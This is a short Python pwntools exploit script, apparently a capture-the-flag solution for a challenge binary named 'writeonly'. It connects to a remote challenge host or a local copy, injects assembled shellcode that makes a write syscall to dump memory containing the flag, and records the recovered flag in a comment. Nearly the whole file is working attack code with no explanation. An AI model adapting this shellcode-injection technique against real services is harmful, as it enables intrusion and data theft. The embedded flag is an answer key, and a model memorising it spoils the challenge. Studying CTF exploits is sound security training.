#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./writeonly_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc 147.78.1.47 40183"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    payload = asm("""
                mov rsi, rax
                mov rdx, 50
                mov rdi, 1
                mov rax, 1
                syscall
                  """)
    
    r.sendline(payload)
    #1753c{yes_its_write_only_but_you_can_read_it_too}

    r.interactive()

if __name__ == "__main__":
    main()